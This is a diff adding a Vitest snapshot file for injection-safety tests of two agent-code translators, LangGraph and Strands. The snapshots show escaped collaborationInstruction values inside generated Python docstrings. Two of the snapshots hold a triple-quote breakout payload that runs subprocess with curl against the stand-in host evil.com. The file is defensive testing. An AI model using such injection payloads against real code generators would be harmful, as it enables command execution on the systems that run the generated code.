@@ -1,0 +1,43 @@
+// Vitest Snapshot v1, https://vitest.dev/guide/snapshot.html
+
+exports[`LangGraphTranslator - collaborationInstruction injection safety > neutralizes triple-quote injection in collaborationInstruction 1`] = `
+"@tool
+def invoke_collab(query: str, state: Annotated[dict, InjectedState]) -> str:
+    """Invoke the collaborator agent/specialist with the following description: {'agentName': 'collab-agent', 'collaboratorName': 'invoke_collab', 'collaboratorInstruction': '\\"\\"\\"
+import subprocess; subprocess.run(["curl","evil.com"])
+\\"\\"\\"'}"""
+    
+    invoke_agent_response = invoke_collab_collaborator(query)
+    tools_used.update([msg.name for msg in invoke_agent_response if isinstance(msg, ToolMessage)])
+    return invoke_agent_response"
+`;
+
+exports[`LangGraphTranslator - collaborationInstruction injection safety > preserves backslashes in collaborationInstruction without doubling 1`] = `
+"@tool
+def invoke_collab(query: str, state: Annotated[dict, InjectedState]) -> str:
+    """Invoke the collaborator agent/specialist with the following description: {'agentName': 'collab-agent', 'collaboratorName': 'invoke_collab', 'collaboratorInstruction': 'C:\\\\path\\\\to\\\\file and regex \\\\d+'}"""
+    
+    invoke_agent_response = invoke_collab_collaborator(query)
+    tools_used.update([msg.name for msg in invoke_agent_response if isinstance(msg, ToolMessage)])
+    return invoke_agent_response"
+`;
+
+exports[`StrandsTranslator - collaborationInstruction injection safety > neutralizes triple-quote injection in collaborationInstruction 1`] = `
+"@tool
+def invoke_collab(query: str) -> str:
+    """Invoke the collaborator agent/specialist with the following description: {'agentName': 'collab-agent', 'collaboratorName': 'invoke_collab', 'collaboratorInstruction': '\\"\\"\\"
+import subprocess; subprocess.run(["curl","evil.com"])
+\\"\\"\\"'}"""
+    
+    invoke_agent_response = invoke_collab_collaborator(query)
+    return invoke_agent_response"
+`;
+
+exports[`StrandsTranslator - collaborationInstruction injection safety > preserves backslashes in collaborationInstruction without doubling 1`] = `
+"@tool
+def invoke_collab(query: str) -> str:
+    """Invoke the collaborator agent/specialist with the following description: {'agentName': 'collab-agent', 'collaboratorName': 'invoke_collab', 'collaboratorInstruction': 'C:\\\\path\\\\to\\\\file and regex \\\\d+'}"""
+    
+    invoke_agent_response = invoke_collab_collaborator(query)
+    return invoke_agent_response"
+`;
